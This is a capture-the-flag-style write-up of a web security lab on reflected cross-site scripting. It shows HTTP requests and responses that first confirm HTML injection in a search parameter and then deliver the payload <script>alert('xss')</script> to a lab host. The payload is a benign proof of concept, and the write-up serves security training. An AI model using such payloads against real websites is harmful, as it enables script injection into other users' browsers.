### Lab: Reflected XSS into HTML context with nothing encoded

#### **Recon:**
-----
**Request:**
```http
GET /?search=<b>content_injection</b> HTTP/2
Host: 04a.web-security-academy.net

...Omitted for Brevity...
```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6791

...Omitted for Brevity...
```

`view-source:https://04a.web-security-academy.net/?search=<b>content_injection</b>
```html
...Omitted for Brevity...

<section class=blog-header>
	<h1>0 search results for '<b>content_injection</b>'</h1>
	<hr>
</section>

...Omitted for Brevity...
```
Content Injection Confirmed

**Affected Location:**
```
https://04a.web-security-academy.net/?search=<script>alert("xss")</script>
```
### **Exploitation**
-----
**Payload:** 
```js
<script>alert("xss")</script>
```

**Request:**
```http
GET /?search=<script>alert("xss")</script> HTTP/2
Host: 04a.web-security-academy.net

...Omitted for Brevity...

```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6281

...Omitted for Brevity...
                   <section class=blog-header>
                        <h1>0 search results for '<script>alert('xss')</script>'</h1>
                        <hr>
                    </section>
...Omitted for Brevity...

```


